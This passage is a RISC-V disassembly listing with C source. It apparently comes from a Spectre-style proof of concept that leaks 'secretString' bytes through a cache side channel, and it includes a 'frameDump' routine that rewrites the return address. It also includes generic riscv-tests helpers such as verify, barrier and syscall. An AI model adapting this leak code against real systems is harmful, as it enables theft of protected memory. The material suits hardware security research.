    80001452:	cc5ff0ef          	jal	ra,80001116 <topTwoIdx>

        if(output[0] == (int)secretString[len] || output[1] == (int)secretString[len]) 
    80001456:	f9844683          	lbu	a3,-104(s0)
    8000145a:	00001797          	auipc	a5,0x1
    8000145e:	70e78793          	addi	a5,a5,1806 # 80002b68 <secretString>
    80001462:	6398                	ld	a4,0(a5)
    80001464:	fe043783          	ld	a5,-32(s0)
    80001468:	97ba                	add	a5,a5,a4
    8000146a:	0007c783          	lbu	a5,0(a5)
    8000146e:	8736                	mv	a4,a3
    80001470:	02f70163          	beq	a4,a5,80001492 <main+0x1ae>
    80001474:	f9944683          	lbu	a3,-103(s0)
    80001478:	00001797          	auipc	a5,0x1
    8000147c:	6f078793          	addi	a5,a5,1776 # 80002b68 <secretString>
    80001480:	6398                	ld	a4,0(a5)
    80001482:	fe043783          	ld	a5,-32(s0)
    80001486:	97ba                	add	a5,a5,a4
    80001488:	0007c783          	lbu	a5,0(a5)
    8000148c:	8736                	mv	a4,a3
    8000148e:	06f71263          	bne	a4,a5,800014f2 <main+0x20e>
        printf("\033[0;32;32mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    80001492:	fe843703          	ld	a4,-24(s0)
    80001496:	00001797          	auipc	a5,0x1
    8000149a:	62a78793          	addi	a5,a5,1578 # 80002ac0 <array1>
    8000149e:	00f705b3          	add	a1,a4,a5
        (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], 
    800014a2:	00001797          	auipc	a5,0x1
    800014a6:	6c678793          	addi	a5,a5,1734 # 80002b68 <secretString>
    800014aa:	6398                	ld	a4,0(a5)
    800014ac:	fe043783          	ld	a5,-32(s0)
    800014b0:	97ba                	add	a5,a5,a4
    800014b2:	0007c783          	lbu	a5,0(a5)
        printf("\033[0;32;32mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    800014b6:	0007861b          	sext.w	a2,a5
    800014ba:	f8843683          	ld	a3,-120(s0)
        (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], 
    800014be:	f9844783          	lbu	a5,-104(s0)
        printf("\033[0;32;32mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    800014c2:	0007871b          	sext.w	a4,a5
        (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], 
    800014c6:	f9844783          	lbu	a5,-104(s0)
        printf("\033[0;32;32mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    800014ca:	0007851b          	sext.w	a0,a5
    800014ce:	f9043803          	ld	a6,-112(s0)
                                                           hitArray[1], output[1], output[1]); 
    800014d2:	f9944783          	lbu	a5,-103(s0)
        printf("\033[0;32;32mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    800014d6:	0007889b          	sext.w	a7,a5
                                                           hitArray[1], output[1], output[1]); 
    800014da:	f9944783          	lbu	a5,-103(s0)
        printf("\033[0;32;32mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    800014de:	2781                	sext.w	a5,a5
    800014e0:	e03e                	sd	a5,0(sp)
    800014e2:	87aa                	mv	a5,a0
    800014e4:	00001517          	auipc	a0,0x1
    800014e8:	37450513          	addi	a0,a0,884 # 80002858 <atol+0x178>
    800014ec:	5cd000ef          	jal	ra,800022b8 <printf>
    800014f0:	a085                	j	80001550 <main+0x26c>
        else 
        printf("\033[0;32;31mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    800014f2:	fe843703          	ld	a4,-24(s0)
    800014f6:	00001797          	auipc	a5,0x1
    800014fa:	5ca78793          	addi	a5,a5,1482 # 80002ac0 <array1>
    800014fe:	00f705b3          	add	a1,a4,a5
        (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], 
    80001502:	00001797          	auipc	a5,0x1
    80001506:	66678793          	addi	a5,a5,1638 # 80002b68 <secretString>
    8000150a:	6398                	ld	a4,0(a5)
    8000150c:	fe043783          	ld	a5,-32(s0)
    80001510:	97ba                	add	a5,a5,a4
    80001512:	0007c783          	lbu	a5,0(a5)
        printf("\033[0;32;31mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    80001516:	0007861b          	sext.w	a2,a5
    8000151a:	f8843683          	ld	a3,-120(s0)
        (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], 
    8000151e:	f9844783          	lbu	a5,-104(s0)
        printf("\033[0;32;31mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    80001522:	0007871b          	sext.w	a4,a5
        (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], 
    80001526:	f9844783          	lbu	a5,-104(s0)
        printf("\033[0;32;31mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    8000152a:	0007851b          	sext.w	a0,a5
    8000152e:	f9043803          	ld	a6,-112(s0)
                                                           hitArray[1], output[1], output[1]);  
    80001532:	f9944783          	lbu	a5,-103(s0)
        printf("\033[0;32;31mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    80001536:	0007889b          	sext.w	a7,a5
                                                           hitArray[1], output[1], output[1]);  
    8000153a:	f9944783          	lbu	a5,-103(s0)
        printf("\033[0;32;31mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    8000153e:	2781                	sext.w	a5,a5
    80001540:	e03e                	sd	a5,0(sp)
    80001542:	87aa                	mv	a5,a0
    80001544:	00001517          	auipc	a0,0x1
    80001548:	37450513          	addi	a0,a0,884 # 800028b8 <atol+0x1d8>
    8000154c:	56d000ef          	jal	ra,800022b8 <printf>

        // read in the next secret
        ++attackIdx;
    80001550:	fe843783          	ld	a5,-24(s0)
    80001554:	0785                	addi	a5,a5,1
    80001556:	fef43423          	sd	a5,-24(s0)
    for(uint64_t len = 0; len < SECRET_SZ; ++len)
    8000155a:	fe043783          	ld	a5,-32(s0)
    8000155e:	0785                	addi	a5,a5,1
    80001560:	fef43023          	sd	a5,-32(s0)
    80001564:	fe043703          	ld	a4,-32(s0)
    80001568:	47e5                	li	a5,25
    8000156a:	dce7f4e3          	bleu	a4,a5,80001332 <main+0x4e>
    }

    return 0;
    8000156e:	4781                	li	a5,0
}
    80001570:	853e                	mv	a0,a5
    80001572:	60aa                	ld	ra,136(sp)
    80001574:	640a                	ld	s0,128(sp)
    80001576:	6149                	addi	sp,sp,144
    80001578:	8082                	ret

000000008000157a <frameDump>:
    8000157a:	70e2                	ld	ra,56(sp)
    8000157c:	6121                	addi	sp,sp,64
    8000157e:	10f9                	addi	ra,ra,-2
    80001580:	00200313          	li	t1,2
    80001584:	00431393          	slli	t2,t1,0x4
    80001588:	d0337753          	fcvt.s.lu	fa4,t1
    8000158c:	d033f7d3          	fcvt.s.lu	fa5,t2
    80001590:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    80001594:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    80001598:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    8000159c:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    800015a0:	c03793d3          	fcvt.lu.s	t2,fa5,rtz
    800015a4:	909e                	add	ra,ra,t2
    800015a6:	8082                	ret

00000000800015a8 <printArray>:
#include <stdint.h>

#define static_assert(cond) switch(0) { case 0: case !!(long)(cond): ; }

static void printArray(const char name[], int n, const int arr[])
{
    800015a8:	7179                	addi	sp,sp,-48
    800015aa:	f422                	sd	s0,40(sp)
    800015ac:	1800                	addi	s0,sp,48
    800015ae:	fea43423          	sd	a0,-24(s0)
    800015b2:	87ae                	mv	a5,a1
    800015b4:	fcc43c23          	sd	a2,-40(s0)
    800015b8:	fef42223          	sw	a5,-28(s0)
  printf( " %10s :", name );
  for ( i = 0; i < n; i++ )
    printf( " %3d ", arr[i] );
  printf( "\n" );
#endif
}
    800015bc:	0001                	nop
    800015be:	7422                	ld	s0,40(sp)
    800015c0:	6145                	addi	sp,sp,48
    800015c2:	8082                	ret

00000000800015c4 <printDoubleArray>:

static void printDoubleArray(const char name[], int n, const double arr[])
{
    800015c4:	7179                	addi	sp,sp,-48
    800015c6:	f422                	sd	s0,40(sp)
    800015c8:	1800                	addi	s0,sp,48
    800015ca:	fea43423          	sd	a0,-24(s0)
    800015ce:	87ae                	mv	a5,a1
    800015d0:	fcc43c23          	sd	a2,-40(s0)
    800015d4:	fef42223          	sw	a5,-28(s0)
  printf( " %10s :", name );
  for ( i = 0; i < n; i++ )
    printf( " %g ", arr[i] );
  printf( "\n" );
#endif
}
    800015d8:	0001                	nop
    800015da:	7422                	ld	s0,40(sp)
    800015dc:	6145                	addi	sp,sp,48
    800015de:	8082                	ret

00000000800015e0 <verify>:

static int verify(int n, const volatile int* test, const int* verify)
{
    800015e0:	715d                	addi	sp,sp,-80
    800015e2:	e4a2                	sd	s0,72(sp)
    800015e4:	0880                	addi	s0,sp,80
    800015e6:	87aa                	mv	a5,a0
    800015e8:	fcb43023          	sd	a1,-64(s0)
    800015ec:	fac43c23          	sd	a2,-72(s0)
    800015f0:	fcf42623          	sw	a5,-52(s0)
  int i;
  // Unrolled for faster verification
  for (i = 0; i < n/2*2; i+=2)
    800015f4:	fe042623          	sw	zero,-20(s0)
    800015f8:	a071                	j	80001684 <verify+0xa4>
  {
    int t0 = test[i], t1 = test[i+1];
    800015fa:	fec42783          	lw	a5,-20(s0)
    800015fe:	078a                	slli	a5,a5,0x2
    80001600:	fc043703          	ld	a4,-64(s0)
    80001604:	97ba                	add	a5,a5,a4
    80001606:	439c                	lw	a5,0(a5)
    80001608:	fef42423          	sw	a5,-24(s0)
    8000160c:	fec42783          	lw	a5,-20(s0)
    80001610:	0785                	addi	a5,a5,1
    80001612:	078a                	slli	a5,a5,0x2
    80001614:	fc043703          	ld	a4,-64(s0)
    80001618:	97ba                	add	a5,a5,a4
    8000161a:	439c                	lw	a5,0(a5)
    8000161c:	fef42223          	sw	a5,-28(s0)
    int v0 = verify[i], v1 = verify[i+1];
    80001620:	fec42783          	lw	a5,-20(s0)
    80001624:	078a                	slli	a5,a5,0x2
    80001626:	fb843703          	ld	a4,-72(s0)
    8000162a:	97ba                	add	a5,a5,a4
    8000162c:	439c                	lw	a5,0(a5)
    8000162e:	fef42023          	sw	a5,-32(s0)
    80001632:	fec42783          	lw	a5,-20(s0)
    80001636:	0785                	addi	a5,a5,1
    80001638:	078a                	slli	a5,a5,0x2
    8000163a:	fb843703          	ld	a4,-72(s0)
    8000163e:	97ba                	add	a5,a5,a4
    80001640:	439c                	lw	a5,0(a5)
    80001642:	fcf42e23          	sw	a5,-36(s0)
    if (t0 != v0) return i+1;
    80001646:	fe842703          	lw	a4,-24(s0)
    8000164a:	fe042783          	lw	a5,-32(s0)
    8000164e:	2701                	sext.w	a4,a4
    80001650:	2781                	sext.w	a5,a5
    80001652:	00f70763          	beq	a4,a5,80001660 <verify+0x80>
    80001656:	fec42783          	lw	a5,-20(s0)
    8000165a:	2785                	addiw	a5,a5,1
    8000165c:	2781                	sext.w	a5,a5
    8000165e:	a051                	j	800016e2 <verify+0x102>
    if (t1 != v1) return i+2;
    80001660:	fe442703          	lw	a4,-28(s0)
    80001664:	fdc42783          	lw	a5,-36(s0)
    80001668:	2701                	sext.w	a4,a4
    8000166a:	2781                	sext.w	a5,a5
    8000166c:	00f70763          	beq	a4,a5,8000167a <verify+0x9a>
    80001670:	fec42783          	lw	a5,-20(s0)
    80001674:	2789                	addiw	a5,a5,2
    80001676:	2781                	sext.w	a5,a5
    80001678:	a0ad                	j	800016e2 <verify+0x102>
  for (i = 0; i < n/2*2; i+=2)
    8000167a:	fec42783          	lw	a5,-20(s0)
    8000167e:	2789                	addiw	a5,a5,2
    80001680:	fef42623          	sw	a5,-20(s0)
    80001684:	fcc42783          	lw	a5,-52(s0)
    80001688:	01f7d71b          	srliw	a4,a5,0x1f
    8000168c:	9fb9                	addw	a5,a5,a4
    8000168e:	4017d79b          	sraiw	a5,a5,0x1
    80001692:	2781                	sext.w	a5,a5
    80001694:	0017979b          	slliw	a5,a5,0x1
    80001698:	0007871b          	sext.w	a4,a5
    8000169c:	fec42783          	lw	a5,-20(s0)
    800016a0:	2781                	sext.w	a5,a5
    800016a2:	f4e7cce3          	blt	a5,a4,800015fa <verify+0x1a>
  }
  if (n % 2 != 0 && test[n-1] != verify[n-1])
    800016a6:	fcc42783          	lw	a5,-52(s0)
    800016aa:	8b85                	andi	a5,a5,1
    800016ac:	2781                	sext.w	a5,a5
    800016ae:	cb8d                	beqz	a5,800016e0 <verify+0x100>
    800016b0:	fcc42783          	lw	a5,-52(s0)
    800016b4:	078a                	slli	a5,a5,0x2
    800016b6:	17f1                	addi	a5,a5,-4
    800016b8:	fc043703          	ld	a4,-64(s0)
    800016bc:	97ba                	add	a5,a5,a4
    800016be:	439c                	lw	a5,0(a5)
    800016c0:	0007869b          	sext.w	a3,a5
    800016c4:	fcc42783          	lw	a5,-52(s0)
    800016c8:	078a                	slli	a5,a5,0x2
    800016ca:	17f1                	addi	a5,a5,-4
    800016cc:	fb843703          	ld	a4,-72(s0)
    800016d0:	97ba                	add	a5,a5,a4
    800016d2:	439c                	lw	a5,0(a5)
    800016d4:	8736                	mv	a4,a3
    800016d6:	00f70563          	beq	a4,a5,800016e0 <verify+0x100>
    return n;
    800016da:	fcc42783          	lw	a5,-52(s0)
    800016de:	a011                	j	800016e2 <verify+0x102>
  return 0;
    800016e0:	4781                	li	a5,0
}
    800016e2:	853e                	mv	a0,a5
    800016e4:	6426                	ld	s0,72(sp)
    800016e6:	6161                	addi	sp,sp,80
    800016e8:	8082                	ret

00000000800016ea <verifyDouble>:

static int verifyDouble(int n, const volatile double* test, const double* verify)
{
    800016ea:	711d                	addi	sp,sp,-96
    800016ec:	eca2                	sd	s0,88(sp)
    800016ee:	1080                	addi	s0,sp,96
    800016f0:	87aa                	mv	a5,a0
    800016f2:	fab43823          	sd	a1,-80(s0)
    800016f6:	fac43423          	sd	a2,-88(s0)
    800016fa:	faf42e23          	sw	a5,-68(s0)
  int i;
  // Unrolled for faster verification
  for (i = 0; i < n/2*2; i+=2)
    800016fe:	fe042623          	sw	zero,-20(s0)
    80001702:	a065                	j	800017aa <verifyDouble+0xc0>
  {
    double t0 = test[i], t1 = test[i+1];
    80001704:	fec42783          	lw	a5,-20(s0)
    80001708:	078e                	slli	a5,a5,0x3
    8000170a:	fb043703          	ld	a4,-80(s0)
    8000170e:	97ba                	add	a5,a5,a4
    80001710:	239c                	fld	fa5,0(a5)
    80001712:	fef43027          	fsd	fa5,-32(s0)
    80001716:	fec42783          	lw	a5,-20(s0)
    8000171a:	0785                	addi	a5,a5,1
    8000171c:	078e                	slli	a5,a5,0x3
    8000171e:	fb043703          	ld	a4,-80(s0)
    80001722:	97ba                	add	a5,a5,a4
    80001724:	239c                	fld	fa5,0(a5)
    80001726:	fcf43c27          	fsd	fa5,-40(s0)
    double v0 = verify[i], v1 = verify[i+1];
    8000172a:	fec42783          	lw	a5,-20(s0)
    8000172e:	078e                	slli	a5,a5,0x3
    80001730:	fa843703          	ld	a4,-88(s0)
    80001734:	97ba                	add	a5,a5,a4
    80001736:	239c                	fld	fa5,0(a5)
    80001738:	fcf43827          	fsd	fa5,-48(s0)
    8000173c:	fec42783          	lw	a5,-20(s0)
    80001740:	0785                	addi	a5,a5,1
    80001742:	078e                	slli	a5,a5,0x3
    80001744:	fa843703          	ld	a4,-88(s0)
    80001748:	97ba                	add	a5,a5,a4
    8000174a:	239c                	fld	fa5,0(a5)
    8000174c:	fcf43427          	fsd	fa5,-56(s0)
    int eq1 = t0 == v0, eq2 = t1 == v1;
    80001750:	fe043707          	fld	fa4,-32(s0)
    80001754:	fd043787          	fld	fa5,-48(s0)
    80001758:	a2f727d3          	feq.d	a5,fa4,fa5
    8000175c:	00f037b3          	snez	a5,a5
    80001760:	0ff7f793          	andi	a5,a5,255
    80001764:	fcf42223          	sw	a5,-60(s0)
    80001768:	fd843707          	fld	fa4,-40(s0)
    8000176c:	fc843787          	fld	fa5,-56(s0)
    80001770:	a2f727d3          	feq.d	a5,fa4,fa5
    80001774:	00f037b3          	snez	a5,a5
    80001778:	0ff7f793          	andi	a5,a5,255
    8000177c:	fcf42023          	sw	a5,-64(s0)
    if (!(eq1 & eq2)) return i+1+eq1;
    80001780:	fc442703          	lw	a4,-60(s0)
    80001784:	fc042783          	lw	a5,-64(s0)
    80001788:	8ff9                	and	a5,a5,a4
    8000178a:	2781                	sext.w	a5,a5
    8000178c:	eb91                	bnez	a5,800017a0 <verifyDouble+0xb6>
    8000178e:	fec42783          	lw	a5,-20(s0)
    80001792:	2785                	addiw	a5,a5,1
    80001794:	2781                	sext.w	a5,a5
    80001796:	fc442703          	lw	a4,-60(s0)
    8000179a:	9fb9                	addw	a5,a5,a4
    8000179c:	2781                	sext.w	a5,a5
    8000179e:	a09d                	j	80001804 <verifyDouble+0x11a>
  for (i = 0; i < n/2*2; i+=2)
    800017a0:	fec42783          	lw	a5,-20(s0)
    800017a4:	2789                	addiw	a5,a5,2
    800017a6:	fef42623          	sw	a5,-20(s0)
    800017aa:	fbc42783          	lw	a5,-68(s0)
    800017ae:	01f7d71b          	srliw	a4,a5,0x1f
    800017b2:	9fb9                	addw	a5,a5,a4
    800017b4:	4017d79b          	sraiw	a5,a5,0x1
    800017b8:	2781                	sext.w	a5,a5
    800017ba:	0017979b          	slliw	a5,a5,0x1
    800017be:	0007871b          	sext.w	a4,a5
    800017c2:	fec42783          	lw	a5,-20(s0)
    800017c6:	2781                	sext.w	a5,a5
    800017c8:	f2e7cee3          	blt	a5,a4,80001704 <verifyDouble+0x1a>
  }
  if (n % 2 != 0 && test[n-1] != verify[n-1])
    800017cc:	fbc42783          	lw	a5,-68(s0)
    800017d0:	8b85                	andi	a5,a5,1
    800017d2:	2781                	sext.w	a5,a5
    800017d4:	c79d                	beqz	a5,80001802 <verifyDouble+0x118>
    800017d6:	fbc42783          	lw	a5,-68(s0)
    800017da:	078e                	slli	a5,a5,0x3
    800017dc:	17e1                	addi	a5,a5,-8
    800017de:	fb043703          	ld	a4,-80(s0)
    800017e2:	97ba                	add	a5,a5,a4
    800017e4:	2398                	fld	fa4,0(a5)
    800017e6:	fbc42783          	lw	a5,-68(s0)
    800017ea:	078e                	slli	a5,a5,0x3
    800017ec:	17e1                	addi	a5,a5,-8
    800017ee:	fa843703          	ld	a4,-88(s0)
    800017f2:	97ba                	add	a5,a5,a4
    800017f4:	239c                	fld	fa5,0(a5)
    800017f6:	a2f727d3          	feq.d	a5,fa4,fa5
    800017fa:	e781                	bnez	a5,80001802 <verifyDouble+0x118>
    return n;
    800017fc:	fbc42783          	lw	a5,-68(s0)
    80001800:	a011                	j	80001804 <verifyDouble+0x11a>
  return 0;
    80001802:	4781                	li	a5,0
}
    80001804:	853e                	mv	a0,a5
    80001806:	6466                	ld	s0,88(sp)
    80001808:	6125                	addi	sp,sp,96
    8000180a:	8082                	ret

000000008000180c <barrier>:

static void __attribute__((noinline)) barrier(int ncores)
{
    8000180c:	1101                	addi	sp,sp,-32
    8000180e:	ec22                	sd	s0,24(sp)
    80001810:	1000                	addi	s0,sp,32
    80001812:	87aa                	mv	a5,a0
    80001814:	fef42623          	sw	a5,-20(s0)
  static volatile int sense;
  static volatile int count;
  static __thread int threadsense;

  __sync_synchronize();
    80001818:	0ff0000f          	fence

  threadsense = !threadsense;
    8000181c:	00022783          	lw	a5,0(tp) # 0 <_tdata_begin>
    80001820:	0017b793          	seqz	a5,a5
    80001824:	0ff7f793          	andi	a5,a5,255
    80001828:	0007871b          	sext.w	a4,a5
    8000182c:	00e22023          	sw	a4,0(tp) # 0 <_tdata_begin>
  if (__sync_fetch_and_add(&count, 1) == ncores-1)
    80001830:	0001a797          	auipc	a5,0x1a
    80001834:	43078793          	addi	a5,a5,1072 # 8001bc60 <count.2896>
    80001838:	4705                	li	a4,1
    8000183a:	0f50000f          	fence	iorw,ow
    8000183e:	04e7a6af          	amoadd.w.aq	a3,a4,(a5)
    80001842:	0006879b          	sext.w	a5,a3
    80001846:	0007871b          	sext.w	a4,a5
    8000184a:	fec42783          	lw	a5,-20(s0)
    8000184e:	37fd                	addiw	a5,a5,-1
    80001850:	2781                	sext.w	a5,a5
    80001852:	02f71063          	bne	a4,a5,80001872 <barrier+0x66>
  {
    count = 0;
    80001856:	0001a797          	auipc	a5,0x1a
    8000185a:	40a78793          	addi	a5,a5,1034 # 8001bc60 <count.2896>
    8000185e:	0007a023          	sw	zero,0(a5)
    sense = threadsense;
    80001862:	00022703          	lw	a4,0(tp) # 0 <_tdata_begin>
    80001866:	0001a797          	auipc	a5,0x1a
    8000186a:	3fe78793          	addi	a5,a5,1022 # 8001bc64 <sense.2895>
    8000186e:	c398                	sw	a4,0(a5)
    80001870:	a829                	j	8000188a <barrier+0x7e>
  }
  else while(sense != threadsense)
    80001872:	0001                	nop
    80001874:	0001a797          	auipc	a5,0x1a
    80001878:	3f078793          	addi	a5,a5,1008 # 8001bc64 <sense.2895>
    8000187c:	439c                	lw	a5,0(a5)
    8000187e:	0007871b          	sext.w	a4,a5
    80001882:	00022783          	lw	a5,0(tp) # 0 <_tdata_begin>
    80001886:	fef717e3          	bne	a4,a5,80001874 <barrier+0x68>
    ;

  __sync_synchronize();
    8000188a:	0ff0000f          	fence
}
    8000188e:	0001                	nop
    80001890:	6462                	ld	s0,24(sp)
    80001892:	6105                	addi	sp,sp,32
    80001894:	8082                	ret

0000000080001896 <lfsr>:

static uint64_t lfsr(uint64_t x)
{
    80001896:	7179                	addi	sp,sp,-48
    80001898:	f422                	sd	s0,40(sp)
    8000189a:	1800                	addi	s0,sp,48
    8000189c:	fca43c23          	sd	a0,-40(s0)
  uint64_t bit = (x ^ (x >> 1)) & 1;
    800018a0:	fd843783          	ld	a5,-40(s0)
    800018a4:	0017d713          	srli	a4,a5,0x1
    800018a8:	fd843783          	ld	a5,-40(s0)
    800018ac:	8fb9                	xor	a5,a5,a4
    800018ae:	8b85                	andi	a5,a5,1
    800018b0:	fef43423          	sd	a5,-24(s0)
  return (x >> 1) | (bit << 62);
    800018b4:	fd843783          	ld	a5,-40(s0)
    800018b8:	0017d713          	srli	a4,a5,0x1
    800018bc:	fe843783          	ld	a5,-24(s0)
    800018c0:	17fa                	slli	a5,a5,0x3e
    800018c2:	8fd9                	or	a5,a5,a4
}
    800018c4:	853e                	mv	a0,a5
    800018c6:	7422                	ld	s0,40(sp)
    800018c8:	6145                	addi	sp,sp,48
    800018ca:	8082                	ret

00000000800018cc <syscall>:

extern volatile uint64_t tohost;
extern volatile uint64_t fromhost;

static uintptr_t syscall(uintptr_t which, uint64_t arg0, uint64_t arg1, uint64_t arg2)
{
    800018cc:	7171                	addi	sp,sp,-176
    800018ce:	f522                	sd	s0,168(sp)
    800018d0:	1900                	addi	s0,sp,176
    800018d2:	f6a43c23          	sd	a0,-136(s0)
    800018d6:	f6b43823          	sd	a1,-144(s0)
    800018da:	f6c43423          	sd	a2,-152(s0)
    800018de:	f6d43023          	sd	a3,-160(s0)
    800018e2:	ff040793          	addi	a5,s0,-16
    800018e6:	f4f43c23          	sd	a5,-168(s0)
    800018ea:	f5843783          	ld	a5,-168(s0)
    800018ee:	f9078793          	addi	a5,a5,-112
    800018f2:	03f78793          	addi	a5,a5,63
    800018f6:	8399                	srli	a5,a5,0x6
    800018f8:	079a                	slli	a5,a5,0x6
  volatile uint64_t magic_mem[8] __attribute__((aligned(64)));
  magic_mem[0] = which;
    800018fa:	f7843703          	ld	a4,-136(s0)
    800018fe:	e398                	sd	a4,0(a5)
  magic_mem[1] = arg0;
    80001900:	f7043703          	ld	a4,-144(s0)
    80001904:	e798                	sd	a4,8(a5)
  magic_mem[2] = arg1;
    80001906:	f6843703          	ld	a4,-152(s0)
    8000190a:	eb98                	sd	a4,16(a5)
  magic_mem[3] = arg2;
    8000190c:	f6043703          	ld	a4,-160(s0)
    80001910:	ef98                	sd	a4,24(a5)
  __sync_synchronize();
    80001912:	0ff0000f          	fence

  tohost = (uintptr_t)magic_mem;
    80001916:	86be                	mv	a3,a5
    80001918:	fffff717          	auipc	a4,0xfffff
    8000191c:	6e870713          	addi	a4,a4,1768 # 80001000 <tohost>
    80001920:	e314                	sd	a3,0(a4)
  while (fromhost == 0)
    80001922:	0001                	nop
    80001924:	fffff717          	auipc	a4,0xfffff
    80001928:	71c70713          	addi	a4,a4,1820 # 80001040 <fromhost>
    8000192c:	6318                	ld	a4,0(a4)
    8000192e:	db7d                	beqz	a4,80001924 <syscall+0x58>
    ;
  fromhost = 0;
    80001930:	fffff717          	auipc	a4,0xfffff
    80001934:	71070713          	addi	a4,a4,1808 # 80001040 <fromhost>
    80001938:	00073023          	sd	zero,0(a4)

  __sync_synchronize();
    8000193c:	0ff0000f          	fence
  return magic_mem[0];
    80001940:	639c                	ld	a5,0(a5)
}
    80001942:	853e                	mv	a0,a5
    80001944:	742a                	ld	s0,168(sp)
    80001946:	614d                	addi	sp,sp,176
    80001948:	8082                	ret

000000008000194a <setStats>:
#define NUM_COUNTERS 2
static uintptr_t counters[NUM_COUNTERS];
static char* counter_names[NUM_COUNTERS];

void setStats(int enable)
{
    8000194a:	715d                	addi	sp,sp,-80
    8000194c:	e4a2                	sd	s0,72(sp)
    8000194e:	0880                	addi	s0,sp,80
    80001950:	87aa                	mv	a5,a0
    80001952:	faf42e23          	sw	a5,-68(s0)
  int i = 0;
    80001956:	fc042e23          	sw	zero,-36(s0)
    uintptr_t csr = read_csr(name); \
    if (!enable) { csr -= counters[i]; counter_names[i] = #name; } \
    counters[i++] = csr; \
  } while (0)

  READ_CTR(mcycle);
    8000195a:	fdc42783          	lw	a5,-36(s0)
    8000195e:	0007871b          	sext.w	a4,a5
    80001962:	4785                	li	a5,1
    80001964:	fee7cbe3          	blt	a5,a4,8000195a <setStats+0x10>
    80001968:	b00027f3          	csrr	a5,mcycle
    8000196c:	fcf43823          	sd	a5,-48(s0)
    80001970:	fd043783          	ld	a5,-48(s0)
    80001974:	fef43423          	sd	a5,-24(s0)
    80001978:	fbc42783          	lw	a5,-68(s0)
    8000197c:	2781                	sext.w	a5,a5
    8000197e:	ef8d                	bnez	a5,800019b8 <setStats+0x6e>
    80001980:	0001a717          	auipc	a4,0x1a
    80001984:	2c070713          	addi	a4,a4,704 # 8001bc40 <counters>
    80001988:	fdc42783          	lw	a5,-36(s0)
    8000198c:	078e                	slli	a5,a5,0x3
    8000198e:	97ba                	add	a5,a5,a4
    80001990:	639c                	ld	a5,0(a5)
    80001992:	fe843703          	ld	a4,-24(s0)
    80001996:	40f707b3          	sub	a5,a4,a5
    8000199a:	fef43423          	sd	a5,-24(s0)
    8000199e:	0001a717          	auipc	a4,0x1a
    800019a2:	2b270713          	addi	a4,a4,690 # 8001bc50 <counter_names>
    800019a6:	fdc42783          	lw	a5,-36(s0)
    800019aa:	078e                	slli	a5,a5,0x3
    800019ac:	97ba                	add	a5,a5,a4
    800019ae:	00001717          	auipc	a4,0x1
    800019b2:	f6a70713          	addi	a4,a4,-150 # 80002918 <atol+0x238>
    800019b6:	e398                	sd	a4,0(a5)
    800019b8:	fdc42783          	lw	a5,-36(s0)
    800019bc:	0017871b          	addiw	a4,a5,1
    800019c0:	fce42e23          	sw	a4,-36(s0)
    800019c4:	0001a717          	auipc	a4,0x1a
    800019c8:	27c70713          	addi	a4,a4,636 # 8001bc40 <counters>
    800019cc:	078e                	slli	a5,a5,0x3
    800019ce:	97ba                	add	a5,a5,a4
    800019d0:	fe843703          	ld	a4,-24(s0)
    800019d4:	e398                	sd	a4,0(a5)
  READ_CTR(minstret);
    800019d6:	fdc42783          	lw	a5,-36(s0)
    800019da:	0007871b          	sext.w	a4,a5
    800019de:	4785                	li	a5,1
    800019e0:	fee7cbe3          	blt	a5,a4,800019d6 <setStats+0x8c>
    800019e4:	b02027f3          	csrr	a5,minstret
    800019e8:	fcf43423          	sd	a5,-56(s0)
    800019ec:	fc843783          	ld	a5,-56(s0)
    800019f0:	fef43023          	sd	a5,-32(s0)
    800019f4:	fbc42783          	lw	a5,-68(s0)
    800019f8:	2781                	sext.w	a5,a5
    800019fa:	ef8d                	bnez	a5,80001a34 <setStats+0xea>
    800019fc:	0001a717          	auipc	a4,0x1a
    80001a00:	24470713          	addi	a4,a4,580 # 8001bc40 <counters>
    80001a04:	fdc42783          	lw	a5,-36(s0)
    80001a08:	078e                	slli	a5,a5,0x3
    80001a0a:	97ba                	add	a5,a5,a4
    80001a0c:	639c                	ld	a5,0(a5)
    80001a0e:	fe043703          	ld	a4,-32(s0)
    80001a12:	40f707b3          	sub	a5,a4,a5
    80001a16:	fef43023          	sd	a5,-32(s0)
    80001a1a:	0001a717          	auipc	a4,0x1a
    80001a1e:	23670713          	addi	a4,a4,566 # 8001bc50 <counter_names>
    80001a22:	fdc42783          	lw	a5,-36(s0)
    80001a26:	078e                	slli	a5,a5,0x3
